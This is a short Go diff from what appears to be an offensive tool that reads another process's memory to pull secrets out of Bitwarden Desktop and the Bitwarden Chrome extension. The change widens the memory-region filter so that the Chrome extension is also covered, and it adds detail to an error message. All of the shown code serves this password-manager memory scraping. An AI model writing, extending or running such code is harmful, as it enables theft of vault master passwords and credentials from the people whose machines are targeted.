@@ -66,7 +66,7 @@ func searchProcessMemory(pid int, exe string) error {
 		// Filter by type, state, protection and regionsize
 		// Docs: https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information
 
-		if mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE && mbi.Protect == PAGE_READWRITE && mbi.RegionSize <= 0x14000 {
+		if mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE && mbi.Protect == PAGE_READWRITE && mbi.RegionSize < (1 << 25) {
 			// Bitwarden Desktop RegionSize: 0x14000
 			// Bitwarden Chrome RegionSize: < (1 << 25)
 			mem := make([]byte, mbi.RegionSize)
@@ -137,7 +137,7 @@ func searchBWDesktopBytePattern(pid int, mem []byte, mbi win32.MemoryBasicInform
 					fmt.Printf("[!] Contains non-ASCII characters, skipping...\n")
 				}
 			} else {
-				fmt.Printf("[!] Invalid offset size, skipping...\n\n")
+				fmt.Printf("[!] Invalid offset size (%d), skipping...\n\n", passEndOffset[0])
 			}
 
 		} else {
